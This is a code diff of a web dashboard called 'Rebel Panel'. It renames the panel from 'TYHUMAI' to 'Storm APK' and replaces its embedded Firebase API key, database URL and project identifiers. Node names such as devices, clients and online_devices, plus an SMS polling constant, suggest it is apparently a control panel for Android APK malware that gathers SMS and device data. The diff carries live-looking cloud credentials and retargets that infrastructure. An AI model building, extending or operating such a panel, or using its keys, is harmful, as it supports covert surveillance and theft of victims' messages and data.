@@ -590,7 +590,7 @@ header('Content-Type: text/html; charset=UTF-8');
 </div><!-- /main-layout -->
 
 <footer>
-  <div class="footer-brand"><strong>Rebel Panel</strong> — TYHUMAI Dashboard</div>
+  <div class="footer-brand"><strong>Rebel Panel</strong> — Storm APK Dashboard</div>
   <div class="footer-brand" id="footerTime"></div>
 </footer>
 </div><!-- /wrapper -->
@@ -635,21 +635,21 @@ var CLIENTS_CACHE_KEY='ty_clients_cache_v1';
 var CLIENTS_CACHE_TTL=6*60*60*1000;
 var SMS_FAST_MS=100;
 var fetchStartMs=0, firstFetchDone=false;
-var TY_FB_ID='tyhumai_299f1';
+var TY_FB_ID='stormapk_9edea';
 var activeFbId=TY_FB_ID;
 var SUMMARY_NODES=['devices_status','clients'];
 var DEVICE_NODES=['devices','users','clients_list','online_devices'];
 var SKIP_NODES=['config','settings','admin','rules','metadata','logs','test','user','users','messages','admin_pass','adminpass','passwords','webhook','webhooks','tokens','auth'];
 
 var DEFAULT_FIREBASES=[{
-  id:'tyhumai_299f1', name:'TYHUMAI', schema:'rabel',
-  apiKey:'AIzaSyAMbUTWtq5dd--U9-oyGo1nzSEJ3fR7vus',
-  authDomain:'tyhumai-299f1.firebaseapp.com',
-  databaseURL:'https://tyhumai-299f1-default-rtdb.asia-southeast1.firebasedatabase.app',
-  projectId:'tyhumai-299f1',
-  storageBucket:'tyhumai-299f1.firebasestorage.app',
-  messagingSenderId:'857512919356',
-  appId:'1:857512919356:android:292ec32a0f74c34615de39'
+  id:'stormapk_9edea', name:'Storm APK', schema:'rabel',
+  apiKey:'AIzaSyCuFRrF3_yxait_oOFkDxjdrsZkwno_Uy8',
+  authDomain:'stormapk-9edea.firebaseapp.com',
+  databaseURL:'https://stormapk-9edea-default-rtdb.asia-southeast1.firebasedatabase.app',
+  projectId:'stormapk-9edea',
+  storageBucket:'stormapk-9edea.firebasestorage.app',
+  messagingSenderId:'353810391693',
+  appId:'1:353810391693:android:291dcbff91823c3866f8c4'
 }];
 
 function setStatus(t,m){var p=document.getElementById('statusPill');p.className='status-pill'+(t==='connected'?' connected':'');document.getElementById('statusText').textContent=m;}
@@ -743,7 +743,7 @@ function initFirebaseInstance(cfg){
         },appName);
       }
       db=firebase.app(appName).database();
-      db.ref('.info/connected').on('value',function(s){if(s.val())setStatus('connected','Connected · TYHUMAI');});
+      db.ref('.info/connected').on('value',function(s){if(s.val())setStatus('connected','Connected · Storm APK');});
     }catch(e){console.error('FB init error',cfg.id,e);}
   }
   var inst={id:cfg.id,name:cfg.name,config:cfg,appName:appName,db:db,
@@ -813,7 +813,7 @@ function updateSidebarTitle(){
   if(el) el.textContent=inst?inst.name:'—';
 }
 function applyFbTheme(fbId){
-  var hues={'tyhumai_299f1':'255,60,60'};
+  var hues={'stormapk_9edea':'255,60,60'};
   var h=hues[fbId]||String((fbId.charCodeAt(0)*17)%200+40)+',100,200';
   document.documentElement.style.setProperty('--glow','rgba('+h+',0.4)');
   document.documentElement.style.setProperty('--icon-glow','rgba('+h+',0.75)');
